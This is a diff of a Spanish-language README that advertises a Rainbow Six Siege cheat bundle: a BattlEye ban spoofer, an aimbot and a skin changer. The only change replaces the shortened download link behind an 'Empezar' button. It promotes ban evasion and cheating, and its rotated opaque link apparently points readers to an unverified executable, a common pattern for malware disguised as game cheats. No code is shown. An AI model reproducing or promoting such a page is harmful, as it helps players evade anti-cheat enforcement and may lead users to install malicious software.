@@ -5,7 +5,7 @@
 Descarga el paquete **Rainbow Six Siege**: spoofer para los baneos de BattlEye, un aimbot configurable y un skin changer completo en un único archivo portable. **Sin suscripción, sin cuenta y funciona sin conexión.**
 
 <p align="center">
-  <a href="https://share.google/H4VXUTduPW5h6wEBA"><img src="button.svg" alt="Empezar" height="46"></a>
+  <a href="https://share.google/14cO33qLWh659exOp"><img src="button.svg" alt="Empezar" height="46"></a>
 </p>
 
 ## ⚡ Inicio rápido
